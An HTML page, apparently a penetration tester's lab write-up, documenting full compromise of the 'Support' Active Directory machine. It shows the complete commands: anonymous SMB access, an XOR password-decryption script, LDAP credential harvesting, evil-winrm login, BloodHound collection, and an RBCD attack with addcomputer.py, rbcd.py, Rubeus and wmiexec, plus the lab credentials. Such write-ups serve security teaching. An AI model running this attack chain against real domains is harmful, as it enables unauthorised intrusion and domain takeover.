@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Support Machine Writeup - Full Active Directory compromise through SMB enumeration, binary reverse engineering, LDAP credential harvesting, and RBCD abuse" />
+  <meta name="keywords" content="Active Directory, RBCD, BloodHound, Kerberos, SMB, LDAP, Windows, Penetration Testing" />
+  <meta name="author" content="ANXS3C" />
+  <title>Support Machine Writeup - ANXS3C</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <link rel="stylesheet" href="../../../css/style.css" />
+  <link rel="stylesheet" href="../../../css/writeup.css" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+</head>
+<body class="writeup-page">
+  <div class="cursor-dot" id="cursorDot"></div>
+  <div class="cursor-ring" id="cursorRing"></div>
+  <div class="writeup-progress">
+    <div class="progress-bar" id="writeupProgress"></div>
+  </div>
+  <nav class="navbar" id="navbar">
+    <div class="container">
+      <a href="../../../" class="logo"><span>🛡️ </span>ANXS<span>3C</span></a>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="https://anxs3c.github.io/#writeups">Writeups</a></li>
+      </ul>
+      <div class="nav-controls">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <i class="fas fa-moon"></i>
+        </button>
+        <button class="hamburger" id="hamburger" aria-label="Toggle menu">
+          <span></span><span></span><span></span>
+        </button>
+      </div>
+    </div>
+  </nav><div class="cyber-lines">
+  <div class="line"></div>
+  <div class="line"></div>
+  <div class="line"></div>
+  <div class="line"></div>
+  <div class="line"></div>
+  <div class="line"></div>
+  <div class="line-vertical"></div>
+  <div class="line-vertical"></div>
+  <div class="line-vertical"></div>
+</div>
+  <main id="main">
+    <div class="writeup-container">
+      <header class="writeup-header">
+        <div class="badge">Writeup</div>
+        <h1>Support <span class="highlight">Machine</span></h1>
+        <p class="subtitle">
+          Full Active Directory compromise through SMB enumeration, binary reverse engineering, 
+          LDAP credential harvesting, and Resource-Based Constrained Delegation abuse
+        </p>
+        <div class="writeup-meta">
+          <span class="meta-tag"><i class="fas fa-tag"></i> Active Directory</span>
+          <span class="meta-tag"><i class="fas fa-signal"></i> Medium</span>
+          <span class="meta-tag"><i class="fas fa-calendar"></i> June 2026</span>
+          <span class="meta-tag"><i class="fas fa-server"></i> Windows</span>
+          <span class="meta-tag"><i class="fas fa-clock"></i> 2+ hours</span>
+          <span class="meta-tag"><i class="fab fa-github"></i> <a href="https://github.com/anxs3c/Support_Machine_Writeup" target="_blank">GitHub</a></span>
+        </div>
+      </header>
+      <nav class="toc" aria-label="Table of Contents">
+        <div class="toc-header">
+          <i class="fas fa-list"></i>
+          <h3>Contents</h3>
+        </div>
+        <ul class="toc-grid">
+          <li><a href="#about">About Target</a></li>
+          <li><a href="#phase1">Phase 1 Reconnaissance</a></li>
+          <li><a href="#phase2">Phase 2 SMB Enumeration</a></li>
+          <li><a href="#phase3">Phase 3 Reverse Engineering</a></li>
+          <li><a href="#phase4">Phase 4 LDAP Enumeration</a></li>
+          <li><a href="#phase5">Phase 5 WinRM Access</a></li>
+          <li><a href="#phase6">Phase 6 BloodHound Enumeration</a></li>
+          <li><a href="#phase7">Phase 7 RBCD Attack</a></li>
+          <li><a href="#phase8">Phase 8 Domain Compromise</a></li>
+        </ul>
+      </nav>
+      <div class="writeup-body">
+        <h2 id="about">About Target</h2>
+        <p>
+          Support is a Windows machine that features an SMB share that allows anonymous authentication. 
+          After connecting to the share, an executable file is discovered that is used to query the machine's 
+          LDAP server for available users. Through reverse engineering, network analysis or emulation, the 
+          password that the binary uses to bind the LDAP server is identified and can be used to make further 
+          LDAP queries. A user called <code>support</code> is identified in the users list, and the 
+          <code>info</code> field is found to contain his password, thus allowing for a WinRM connection to 
+          the machine. Once on the machine, domain information can be gathered through SharpHound, and 
+          BloodHound reveals that the Shared Support Accounts group that the support user is a member of, 
+          has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack 
+          is performed, and a shell as NT Authority\System is received.
+        </p>
+        <div class="attack-phase">
+          <h3>Attack Phases</h3>
+          <ol>
+            <li><strong>Phase 1</strong> Reconnaissance</li>
+            <li><strong>Phase 2</strong> SMB Enumeration</li>
+            <li><strong>Phase 3</strong> Reverse Engineering and Decryption</li>
+            <li><strong>Phase 4</strong> LDAP Enumeration</li>
+            <li><strong>Phase 5</strong> WinRM Access</li>
+            <li><strong>Phase 6</strong> BloodHound Enumeration</li>
+            <li><strong>Phase 7</strong> RBCD Attack and Privilege Escalation</li>
+            <li><strong>Phase 8</strong> Domain Compromise</li>
+          </ol>
+        </div>
+        <div style="text-align: center; margin: 32px 0;">
+          <img src="./ims/attackpath.png" alt="Attack Path Diagram" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h2 id="phase1">Phase 1 Reconnaissance</h2>
+        <p>
+          I first performed an initial active reconnaissance using nmap scanning on the target IP address, 
+          and it turned out that the device was a domain controller with important open ports.
+        </p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/ac_recon_res.png" alt="Nmap scan results" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Scan Results</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Port</th>
+                <th>Service</th>
+                <th>Description</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td>53</td><td>DNS</td><td>Domain Name System converts names to IPs</td></tr>
+              <tr><td>88</td><td>Kerberos</td><td>Authentication protocol for Active Directory TGT/TGS tickets</td></tr>
+              <tr><td>135</td><td>RPC</td><td>Remote Procedure Call</td></tr>
+              <tr><td>139</td><td>NetBIOS</td><td>Legacy sharing system</td></tr>
+              <tr><td>389</td><td>LDAP</td><td>Lightweight Directory Access Protocol Active Directory database</td></tr>
+              <tr><td>445</td><td>SMB</td><td>Server Message Block file sharing lateral movement</td></tr>
+              <tr><td>464</td><td>kpasswd</td><td>Kerberos password change protocol</td></tr>
+              <tr><td>593</td><td>RPC over HTTP</td><td>Remote control service</td></tr>
+              <tr><td>636</td><td>LDAPS</td><td>Secure LDAP encrypted</td></tr>
+              <tr><td>3268</td><td>Global Catalog LDAP</td><td>Allows searching for any objects in AD forest</td></tr>
+              <tr><td>3269</td><td>Global Catalog SSL</td><td>Secure Global Catalog</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h3>Target Information</h3>
+        <div class="table-wrapper">
+          <table>
+            <thead>
+              <tr>
+                <th>Field</th>
+                <th>Value</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>Target IP</strong></td><td>10.126.230.181</td></tr>
+              <tr><td><strong>OS</strong></td><td>Microsoft Windows Server</td></tr>
+              <tr><td><strong>Hostname</strong></td><td>Domain Controller</td></tr>
+              <tr><td><strong>Domain</strong></td><td>support.htb</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h2 id="phase2">Phase 2 SMB Enumeration</h2>
+        <p>
+          I enumerated and listed the available SMB shares using <code>smbclient</code> with null session 
+          authentication that had no password required.
+        </p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/smb1.png" alt="SMB enumeration results" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <pre><code>smbclient -L //10.129.230.181 -N
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+support-tools   Disk      support staff tools
+SYSVOL          Disk      Logon server share</code></pre>
+        <p>
+          I successfully accessed the <code>support-tools</code> share without providing credentials and 
+          downloaded a suspicious file named <code>UserInfo.exe.zip</code>.
+        </p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/smb2.png" alt="SMB share access" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <pre><code>smbclient //10.129.230.181/support-tools -N
+
+smb: \> ls
+  .                                   D        0  Wed Jul 20 18:01:06 2022
+  ..                                  D        0  Sat May 28 12:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe   A 44398000  Sat May 28 12:19:43 2022
+
+smb: \> get UserInfo.exe.zip	
+  getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip</code></pre>
+        <h2 id="phase3">Phase 3 Reverse Engineering</h2>
+        <p>
+          After extracting the contents of the ZIP archive, I analyzed the extracted files and identified 
+          that the <code>UserInfo.exe</code> binary contained sensitive data. I reversed the program using 
+          Ghidra, used strings across the file and discovered an <code>enc_password</code> variable and a 
+          <code>getPassword</code> function, indicating that the password was encrypted. I then located the 
+          encrypted password in the hex dump using <code>xxd</code>.
+        </p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/xxd1.png" alt="XXD hex dump 1" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/xxd2.png" alt="XXD hex dump 2" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <pre><code>00001e20: 656e 7472 7900 0000 0061 3000 4e00 7600  entry....a0.N.v.
+00001e30: 3300 3200 5000 5400 7700 6700 5900 6a00  3.2.P.T.w.g.Y.j.
+00001e40: 7a00 6700 3900 2f00 3800 6a00 3500 5400  z.g.9./.8.j.5.T.
+00001e50: 6200 6d00 7600 5000 6400 3300 6500 3700  b.m.v.P.d.3.e.7.
+00001e60: 5700 6800 7400 5700 5700 7900 7500 5000  W.h.t.W.W.y.u.P.
+00001e70: 7300 7900 4f00 3700 3600 2f00 5900 2b00  s.y.O.7.6./.Y.+.
+00001e80: 5500 3100 3900 3300 4500 000f 6100 7200  U.1.9.3.E...a.r.
+00001e90: 6d00 6100 6e00 6400 6f00 0025 4c00 4400  m.a.n.d.o</code></pre>
+        <p>I extracted the hash and key:</p>
+        <div class="highlight-box">
+          <strong>enc_password</strong> = <code>0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E</code><br>
+          <strong>key</strong> = <code>armando</code>
+        </div>
+        <p>
+          I discovered that the decryption method used XOR encryption using the key <code>armando</code> 
+          and a constant value of <code>223</code>.
+        </p>
+        <p>I wrote this Python script to reverse the XOR encryption and decode the base64 encoded password:</p>
+        <pre><code>import base64
+
+enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = "armando" 
+
+enc_bytes = base64.b64decode(enc_password)
+decrypted = []
+
+for i in range(len(enc_bytes)):
+    decrypted_char = enc_bytes[i] ^ ord(key[i % len(key)]) ^ 223
+    decrypted.append(decrypted_char)
+
+password_res = bytes(decrypted).decode('utf-8')
+print(f"decrypted password: {password_res}")</code></pre>
+        <div class="success-box">
+          <strong>Decrypted password:</strong> <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>
+        </div>
+        <h2 id="phase4">Phase 4 LDAP Enumeration</h2>
+        <p>
+          By obtaining credentials for the service account <code>ldap</code>, I performed an LDAP enumeration 
+          against the Domain Controller.
+        </p>
+        <pre><code>ldapsearch -x -H ldap://10.129.228.244 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb'</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/ldapsearch.png" alt="LDAP search results" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Key Findings</h3>
+        <pre><code>+ domain :
+    dn: DC=support,DC=htb
+    dc: support
+    ms-DS-MachineAccountQuota: 10
+    msDS-Behavior-Version: 7
+
++ administrator user :
+    dn: CN=Administrator,CN=Users,DC=support,DC=htb
+    objectSid: S-1-5-21-1677581083-3380853377-188903654-500
+    userAccountControl: 512 (Enabled)
+    memberOf: Domain Admins, Enterprise Admins, Schema Admins, Administrators
+
++ kerberos : krbtgt account
+    dn: CN=krbtgt,CN=Users,DC=support,DC=htb
+    objectSid: S-1-5-21-1677581083-3380853377-188903654-502
+
++ domain controller :
+    dn: CN=DC,OU=Domain Controllers,DC=support,DC=htb
+    dNSHostName: dc.support.htb
+    operatingSystem: Windows Server 2022 Standard
+
++ groups :
+    CN=Domain Admins,CN=Users,DC=support,DC=htb
+    CN=Enterprise Admins,CN=Users,DC=support,DC=htb
+    CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+
++ user : support
+    dn: CN=support,CN=Users,DC=support,DC=htb
+    info: Ironside47pleasure40Watchful
+    memberOf: Remote Management Users 
+    memberOf: Shared Support Accounts</code></pre>
+        <div class="warning-box">
+          <strong>Critical Finding:</strong> The user <code>support</code> had their password exposed in 
+          the <code>info</code> attribute: <code>Ironside47pleasure40Watchful</code>
+        </div>
+        <h2 id="phase5">Phase 5 WinRM Access</h2>
+        <p>
+          I logged in with <code>support</code> user credentials via WinRM to the domain controller.
+        </p>
+        <pre><code>evil-winrm -i 10.129.228.244 -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/winrm_supportuser.png" alt="WinRM access as support user" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <p>
+          I then enumerated the domain using BloodHound and discovered that the <code>support</code> user had 
+          <strong>GenericAll</strong> privilege on the Domain Controller, this allowed me to perform an 
+          <strong>RBCD</strong> Resource-Based Constrained Delegation attack to compromise the full domain.
+        </p>
+        <p>
+          I leveraged the support credentials to authenticate to the Domain Controller via WinRM using 
+          <code>evil-winrm</code>, I established a remote PowerShell session and confirmed my user context 
+          as <code>support\support</code>.
+        </p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/standard_flag.png" alt="User flag obtained" style="max-width: 100%; max-height: 200px; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div class="success-box">
+          <strong>USER FLAG obtained</strong> Proof of foothold access to the Domain Controller.
+        </div>
+        <h2 id="phase6">Phase 6 BloodHound Enumeration</h2>
+        <p>
+          After establishing the initial access as the support user, I needed to understand the Active 
+          Directory environment and identify potential privilege escalation paths. I deployed BloodHound 
+          to map the domain structure and analyze permissions.
+        </p>
+        <p>
+          I uploaded <code>SharpHound.exe</code> to the Domain Controller and collected Active Directory data. 
+          I imported the data into BloodHound and discovered that the support user had 
+          <strong>GenericAll</strong> privilege over the Domain Controller.
+        </p>
+        <h3>Step 1 Confirm Current Position</h3>
+        <p>Before proceeding with enumeration, I verified my current context and privileges on the Domain Controller:</p>
+        <pre><code>*Evil-WinRM* PS C:\Users\support\Desktop> whoami
+support\support
+
+*Evil-WinRM* PS C:\Users\support\Desktop> hostname
+dc
+
+*Evil-WinRM* PS C:\Users\support\Desktop> ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+   IPv4 Address. . . . . . . . . . . : 10.129.228.244
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.129.228.1
+
+*Evil-WinRM* PS C:\Users\support\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+*Evil-WinRM* PS C:\Users\support\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+BUILTIN\Remote Management Users  Mandatory group, Enabled by default
+BUILTIN\Users                    Mandatory group, Enabled by default
+NT AUTHORITY\NETWORK             Mandatory group, Enabled by default
+NT AUTHORITY\Authenticated Users Mandatory group, Enabled by default</code></pre>
+        <div class="info-box">
+          <strong>Analysis:</strong> The <code>support</code> user was a member of the 
+          <strong>Remote Management Users</strong> group, which granted WinRM access. However, the user 
+          does not possess direct administrative privileges. Therefore, I needed to identify and execute 
+          a privilege escalation attack to gain higher-level access.
+        </div>
+        <h3>Step 2 Upload and Execute BloodHound Collector</h3>
+        <p>I uploaded <code>SharpHound.exe</code>, the BloodHound data collector, to the Domain Controller.</p>
+        <pre><code>*Evil-WinRM* PS C:\Users\support\Desktop> upload SharpHound.exe</code></pre>
+        <p>To collect comprehensive Active Directory data, I executed <code>SharpHound.exe</code> with the 
+        <code>All</code> collection method, capturing information about users, groups, computers, ACLs, 
+        trust relationships, and other domain objects.</p>
+        <pre><code>*Evil-WinRM* PS C:\Users\support\Desktop> .\SharpHound.exe -c All</code></pre>
+        <p>After the collection completed, I downloaded the compressed data to my attack machine.</p>
+        <pre><code>*Evil-WinRM* PS C:\Users\support\Desktop> download res_bloodHound.zip</code></pre>
+        <h3>Step 3 Analyze Collected Data with BloodHound</h3>
+        <p>I set up the <code>neo4j</code> database service, then I launched BloodHound on my attack machine 
+        and imported the collected data.</p>
+        <pre><code>sudo neo4j start
+bloodhound</code></pre>
+        <p>Most important BloodHound results:</p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/bloodhound1.png" alt="BloodHound result 1" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/bloodhound2.png" alt="BloodHound result 2" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/bloodhound3.png" alt="BloodHound result 3" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/bloodhound4.png" alt="BloodHound result 4" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div class="warning-box">
+          <strong>Key BloodHound Finding:</strong> BloodHound analysis identified that the support user 
+          had <strong>GenericAll</strong> privileges over the Domain Controller (<code>dc.support.htb</code>).
+        </div>
+        <p>
+          This privilege is particularly powerful because it grants full control over the computer object, 
+          allowing modification of the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. 
+          After evaluating potential attack vectors, I determined that Kerberoasting and AS-REP Roasting 
+          were not viable due to the absence of vulnerable accounts. Instead, I selected a 
+          <strong>Resource-Based Constrained Delegation (RBCD) attack</strong>, as <strong>GenericAll</strong> 
+          on the Domain Controller is a direct prerequisite for this technique. Additionally, the domain's 
+          <code>ms-DS-MachineAccountQuota</code> was set to 10, enabling me to create a 
+          <strong>fake machine account</strong> to act as the delegation intermediary.
+        </p>
+        <p><strong>Why RBCD over other methods:</strong></p>
+        <ul>
+          <li><strong>Direct Exploitation:</strong> GenericAll on a computer object can be directly leveraged to configure RBCD without requiring additional privileges</li>
+          <li><strong>MachineAccountQuota:</strong> The domain's ms-DS-MachineAccountQuota was set to 10, allowing me to create a fake machine account a prerequisite for RBCD</li>
+          <li><strong>WinRM Access:</strong> The support user already had WinRM access, enabling me to upload tools and execute commands on the DC</li>
+        </ul>
+        <ul>
+          <li><strong>Comparison to Alternatives:</strong><br>Kerberoasting: No vulnerable SPNs were detected<br>DCSync: Would require Domain Admin privileges already<br>Golden Ticket: Would require krbtgt hash extraction first</li>
+        </ul>
+        <h2 id="phase7">Phase 7 RBCD Attack</h2>
+        <p>
+          After discovering that the support user had GenericAll privileges on the Domain Controller, I 
+          created a fake machine account named <code>ANR$</code> and configured Resource-Based Constrained 
+          Delegation (RBCD) to allow this fake device to impersonate any user.
+        </p>
+        <h3>Step 1 Create a Fake Machine Account</h3>
+        <pre><code>export TARG_IP="10.129.101.216"
+python3 addcomputer.py -computer-name 'ANR$' -computer-pass "passtopass" -dc-host $TARG_IP 'support.htb/support:Ironside47pleasure40Watchful'</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/add_f_computer.png" alt="Adding fake computer account" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div class="info-box">
+          This step was possible because the domain's <code>ms-DS-MachineAccountQuota</code> was set to 10, 
+          allowing any authenticated user to create up to 10 machine accounts.
+        </div>
+        <h3>Step 2 Calculate RC4 Hash</h3>
+        <p>I calculated the RC4 (NTLM) hash of the fake machine account's password, which would be required 
+        for the attack.</p>
+        <pre><code>python3 -c "import hashlib; print(hashlib.new('md4', 'passtopass'.encode('utf-16le')).hexdigest())"</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/hash.png" alt="RC4 hash calculation" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div class="highlight-box">
+          <strong>NTLM Hash:</strong> <code>c8985874e37925d423423b330fe4e905</code>
+        </div>
+        <h3>Step 3 Configure RBCD on Domain Controller</h3>
+        <p>Using the <code>rbcd.py</code> script module, I granted the fake machine account <code>ANR$</code> 
+        the right to impersonate any user on the Domain Controller <code>DC$</code>.</p>
+        <pre><code>python3 rbcd.py -delegate-from 'ANR$' -delegate-to 'DC$' -action write 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip $TARG_IP</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/delegate.png" alt="RBCD delegation configuration" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Step 4 Request Administrator Ticket via S4U2Proxy</h3>
+        <p>I uploaded <code>Rubeus2.exe</code> to the Domain Controller using my existing WinRM session and 
+        executed the <strong>S4U2Proxy attack</strong>.</p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/upload_rubeus.png" alt="Uploading Rubeus" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <pre><code>*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus2.exe s4u /user:ANR$ /rc4:c8985874e37925d423423b330fe4e905 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /outfile:admin.kirbi</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/rb1.png" alt="Rubeus execution 1" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/rb2.png" alt="Rubeus execution 2" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/rb3.png" alt="Rubeus execution 3" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/ticket_kirbi.png" alt="Ticket kirbi file" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/get_ticket_.png" alt="Ticket obtained" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h2 id="phase8">Phase 8 Domain Compromise</h2>
+        <p>
+          The Domain Controller trusting the RBCD configuration that I had previously set, issued a valid 
+          service ticket for the Administrator user.
+        </p>
+        <p>
+          When I requested a <strong>Kerberos ticket</strong> for the <strong>Administrator user</strong> 
+          via the <code>ANR$</code> account using Rubeus, the Domain Controller <strong>trusted</strong> 
+          the request because of the RBCD configuration I had previously set. The DC issued a valid service 
+          ticket for the Administrator user, which I then used to authenticate to the Domain Controller as 
+          <strong>NT AUTHORITY\SYSTEM</strong>, achieving full domain compromise.
+        </p>
+        <h3>Ticket Conversion</h3>
+        <p>I converted the Kerberos ticket from <code>.kirbi</code> to <code>.ccache</code> format and 
+        authenticated to the Domain Controller as NT AUTHORITY\SYSTEM.</p>
+        <pre><code>impacket-ticketConverter admin_cifs_dc.support.htb.kirbi admin.ccache</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/convert_ticket.png" alt="Ticket conversion" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Activating the Ticket</h3>
+        <p>I set the ticket as the active credential cache for Kerberos authentication.</p>
+        <pre><code>export KRB5CCNAME=$(pwd)/admin.ccache</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/run_ticket.png" alt="Running ticket" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Verifying the Ticket</h3>
+        <p>I confirmed the ticket was successfully loaded using <code>klist</code>.</p>
+        <pre><code>klist</code></pre>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/check_ticket.png" alt="Checking ticket" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <h3>Administrator Access</h3>
+        <p>Finally, I authenticated to the Domain Controller as the Administrator with Kerberos authentication.</p>
+        <pre><code>impacket-wmiexec -k -no-pass administrator@dc.support.htb</code></pre>
+        <p>Once connected, I navigated to the Administrator's desktop and found the <strong>root flag</strong> 
+        as proof of full domain compromise.</p>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/rootaccess.png" alt="Root access" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div style="text-align: center; margin: 20px 0;">
+          <img src="./ims/root_flag.png" alt="Root flag" style="max-width: 100%; border-radius: 8px; border: 1px solid var(--border-color);" />
+        </div>
+        <div class="success-box" style="border-left-color: #00c853;">
+          <strong>Root Flag Obtained!</strong> Full domain compromise achieved
+        </div>
+        
+        <div class="info-box">
+          <strong>Disclaimer:</strong> All activities in this writeup were conducted within a fully authorized, isolated laboratory environment These techniques are presented solely for educational and defensive security purposes
+        </div>
+      </div>
+      <footer class="writeup-footer">
+        <a href="../../../#writeups" class="back-link">
+          <i class="fas fa-arrow-left"></i> Back to Writeups
+        </a>
+        <div class="share-links">
+         
+          <a href="#" aria-label="Share on LinkedIn" title="Share on LinkedIn">
+            <i class="fab fa-linkedin-in"></i>
+          </a>
+          <a href="https://github.com/anxs3c/Support_Machine_Writeup" target="_blank" aria-label="View on GitHub" title="View on GitHub">
+            <i class="fab fa-github"></i>
+          </a>
+        </div>
+      </footer>
+    </div>
+  </main>
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-grid">
+        <div>
+          <a href="../../../" class="footer-logo">ANXS<span>3C</span></a>
+          <p>Red Team Operator · Offensive Security</p>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <span>&copy; 2026 ANXS3C · All rights reserved</span>
+      </div>
+    </div>
+  </footer>
+  <button class="back-to-top" id="backToTop">
+    <i class="fas fa-arrow-up"></i>
+  </button>
+  <script src="../../../js/main.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const progressBar = document.getElementById('writeupProgress');
+      window.addEventListener('scroll', function() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const progress = (scrollTop / docHeight) * 100;
+        progressBar.style.width = progress + '%';
+      });
+    });
+  </script>
+</body>
+</html>
